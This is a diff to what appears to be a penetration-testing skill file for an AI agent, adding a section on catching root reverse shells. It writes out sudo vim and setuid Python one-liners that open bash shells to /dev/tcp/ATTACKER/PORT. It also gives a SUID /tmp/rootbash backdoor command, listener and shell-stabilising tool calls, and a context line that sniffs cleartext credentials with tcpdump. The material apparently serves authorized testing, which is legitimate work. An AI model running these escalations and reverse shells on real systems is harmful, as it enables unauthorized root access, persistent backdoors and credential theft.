@@ -738,6 +738,29 @@ tcpdump -i any -A -s0 'port 80 or port 21 or port 25' 2>/dev/null | grep -iE "us
 
 ## Step 7: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When a sudo/SUID/capability exploit produces a root shell, **catch it via the
+MCP shell-server** rather than relying on the shell spawning in the current
+terminal. Many GTFOBins escalations and capability abuses spawn an interactive
+root shell that the agent cannot directly interact with.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Modify the exploit to send a reverse shell instead of spawning locally:
+   ```bash
+   # Instead of: sudo vim -c ':!bash'
+   # Use:
+   sudo vim -c ':!bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
+   # Or for SUID/capability exploits:
+   python3 -c 'import os; os.setuid(0); os.system("bash -i >& /dev/tcp/ATTACKER/PORT 0>&1")'
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="id")`
+
+If the target lacks outbound connectivity, use the SUID bash approach
+(`cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash`) and access it
+through an existing shell session.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
